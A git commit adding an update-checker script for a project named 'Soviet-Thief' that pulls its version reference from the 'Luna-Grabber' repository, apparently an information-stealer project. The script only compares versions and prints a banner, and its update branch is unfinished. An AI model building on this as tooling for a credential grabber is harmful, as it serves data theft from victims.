c14c41a1bc5763368b453e8bba1ac722ec97c3af
SovietArmory <141966479+SovietArmory@users.noreply.github.com>
2023-08-10 23:57:22 +0200

    Add files via upload

---
+++ tools/update.py
@@ -0,0 +1,38 @@
+import os
+import sys
+from time import sleep
+from zipfile import ZipFile
+
+import requests
+
+
+class Update():
+    def __init__(self):
+        self.version = '1.5.7'
+        self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
+        self.zipfile = 'https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip'
+        self.update_checker()
+
+    def update_checker(self):
+        code = requests.get(self.github).text
+        if "self.version = '1.5.7'" in code:
+            print('This version is up to date!')
+            sleep(1)
+            print('You can now open builder.pyw to open the builder!')
+            sleep(1)
+            print('Exiting...')
+            sleep(2)
+            sys.exit()
+        else:
+            print('''
+                    ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
+                    ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
+                    ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
+                    ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
+                    ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
+                    ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
+                                      Your version of Soviet-Thief is outdated!''')
+            choice = input('\nWould you like to update? (y/n): ')
+ 
+if __name__ == '__main__':
+    Update()
